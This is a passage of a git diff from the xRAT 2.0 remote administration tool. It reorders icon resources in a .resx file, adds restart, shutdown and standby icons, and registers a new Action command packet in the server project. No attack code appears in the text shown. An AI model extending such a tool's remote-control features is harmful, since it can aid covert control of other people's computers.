+-    <value>..\images\server.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+-  </data>
++  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+   <data name="mouse_delete" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\mouse_delete.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="key_go" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\key_go.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="uac-shield" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\uac-shield.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="information" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\information.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="refresh" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\refresh.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="folder" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\folder.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="terminal" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\terminal.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="task-manager" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\task-manager.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+   <data name="copy" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\copy.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
++  <data name="key_go" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\key_go.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
+   <data name="cancel" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\cancel.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="xRAT-64x64" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\icons\xRAT-64x64.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="world_link" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\world_link.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="textfield_rename" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\Resources\textfield_rename.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+   <data name="computer" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\computer.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="server-disconnect" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\server-disconnect.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="monitor" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\monitor.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+   <data name="TermsOfUse" xml:space="preserve">
+     <value>    xRAT 2.0
+@@ -183,23 +183,17 @@
+     
+     By using this product you agree to everything specified above.</value>
+   </data>
+-  <data name="terminal" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\terminal.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+-  </data>
+-  <data name="server-uninstall" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\server-uninstall.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+-  </data>
+   <data name="server-add" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\server-add.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="run" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\run.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="server-uninstall" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\server-uninstall.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="eye" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\eye.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="folder" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\folder.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="world_link" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\world_link.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="delete" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\Resources\delete.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+   <data name="download" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\download.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+@@ -207,23 +201,41 @@
+   <data name="mouse_add" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\mouse_add.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="monitor" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\monitor.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="server-reconnect" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\server-reconnect.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="uac-shield" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\uac-shield.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="server-disconnect" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\server-disconnect.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="eye" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\eye.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="xRAT-64x64" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\icons\xRAT-64x64.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="run" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\run.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+   <data name="bricks" type="System.Resources.ResXFileRef, System.Windows.Forms">
+     <value>..\images\bricks.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="refresh" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\refresh.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="server" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\server.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+-  <data name="task-manager" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\task-manager.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="information" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\images\information.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+   <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+-  <data name="textfield_rename" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\Resources\textfield_rename.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  <data name="actions" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\Resources\actions.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="restart" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\Resources\restart.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="shutdown" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\Resources\shutdown.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
++  </data>
++  <data name="standby" type="System.Resources.ResXFileRef, System.Windows.Forms">
++    <value>..\Resources\standby.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+   </data>
+ </root>
+\ No newline at end of file
+diff --git a/Server/Resources/actions.png b/Server/Resources/actions.png
+new file mode 100644
+index 0000000..d7da501
+Binary files /dev/null and b/Server/Resources/actions.png differ
+diff --git a/Server/Resources/restart.png b/Server/Resources/restart.png
+new file mode 100644
+index 0000000..97be114
+Binary files /dev/null and b/Server/Resources/restart.png differ
+diff --git a/Server/Resources/shutdown.png b/Server/Resources/shutdown.png
+new file mode 100644
+index 0000000..baaedc9
+Binary files /dev/null and b/Server/Resources/shutdown.png differ
+diff --git a/Server/Resources/standby.png b/Server/Resources/standby.png
+new file mode 100644
+index 0000000..68debea
+Binary files /dev/null and b/Server/Resources/standby.png differ
+diff --git a/Server/Server.csproj b/Server/Server.csproj
+index 66c4822..2189c09 100644
+--- a/Server/Server.csproj
++++ b/Server/Server.csproj
+@@ -85,6 +85,7 @@
+     <Compile Include="Core\Packets\ClientPackets\Connection\KeepAliveResponse.cs" />
+     <Compile Include="Core\Packets\ClientPackets\Commands\Status.cs" />
+     <Compile Include="Core\Packets\IPacket.cs" />
++    <Compile Include="Core\Packets\ServerPackets\Commands\Action.cs" />
+     <Compile Include="Core\Packets\ServerPackets\Commands\Delete.cs" />
+     <Compile Include="Core\Packets\ServerPackets\Commands\Desktop.cs" />
+     <Compile Include="Core\Packets\ServerPackets\Commands\Directory.cs" />
